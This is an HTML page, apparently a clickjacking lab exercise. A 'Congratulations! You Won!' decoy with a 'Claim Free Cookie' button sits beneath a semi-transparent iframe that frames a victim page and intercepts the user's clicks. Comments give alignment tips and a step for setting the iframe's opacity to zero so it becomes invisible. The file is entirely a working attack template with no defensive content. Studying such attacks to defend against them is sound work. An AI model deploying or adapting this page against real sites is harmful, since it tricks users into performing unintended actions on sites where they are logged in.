<!DOCTYPE html>
<html>
<head>
    <title>Win Free Prizes!</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }

        /* The innocent looking decoy layer */
        #decoy-layer {
            position: absolute;
            top: 100px;
            left: 50px;
            z-index: 1; /* Sits behind the hidden iframe */
        }
        #decoy-button {
            background-color: green;
            color: white;
            padding: 15px 40px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }

        /* The malicious iframe framing the victim site */
        #target-iframe {
            position: absolute;
            top: 80px;  /* Adjust these values to align the buttons perfectly */
            left: 30px; /* Adjust these values to align the buttons perfectly */
            width: 500px;
            height: 300px;
            border: 2px dashed gray; /* Kept visible for alignment practice */
            z-index: 2; /* Sits on top of the decoy layer to intercept clicks */

            /* STEP 5 CONFIGURATION: Change opacity to 0.0 to make it invisible */
            opacity: 0.4; 
        }
    </style>
</head>
<body>
    <div id="decoy-layer">
        <h1>Congratulations! You Won!</h1>
        <button id="decoy-button">Claim Free Cookie</button>
    </div>

    <!-- Attacker embeds the victim site -->
    <iframe id="target-iframe" src="victim.html"></iframe>
</body>
</html>
